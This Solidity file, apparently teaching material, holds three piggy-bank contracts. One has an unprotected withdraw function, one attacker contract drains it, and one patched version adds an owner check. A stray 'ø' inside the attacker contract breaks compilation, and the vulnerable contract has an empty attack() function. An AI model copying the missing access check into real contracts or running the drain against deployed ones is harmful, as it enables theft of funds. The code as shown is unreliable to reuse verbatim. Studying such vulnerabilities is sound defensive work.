// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

/// @title VulnerablePiggyBank - A vulnerable piggy bank contract
contract VulnerablePiggyBank {
    address public owner;
    constructor() { owner = msg.sender; }
    function deposit() public payable {}
    function withdraw() public { payable(msg.sender).transfer(address(this).balance); }
    function attack() public { }
}

/// @title AttackPiggyBank - A contract that exploits the vulnerable one
contract AttackPiggyBank {
    VulnerablePiggyBank public target;
ø
    constructor(address _target) {
        target = VulnerablePiggyBank(_target);
    }

    // Call the vulnerable withdraw to drain ETH
    function attack() public {
        target.withdraw();
    }

    // Receive ETH
    receive() external payable {}
}



/// @title SecurePiggyBank - Audited version of the vulnerable contract
contract SecurePiggyBank {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // Accept deposits
    function deposit() public payable {}

    // Withdraw funds
    function withdraw() public {
        require(msg.sender == owner, "Not owner");

        payable(msg.sender).transfer(address(this).balance);
    }
}

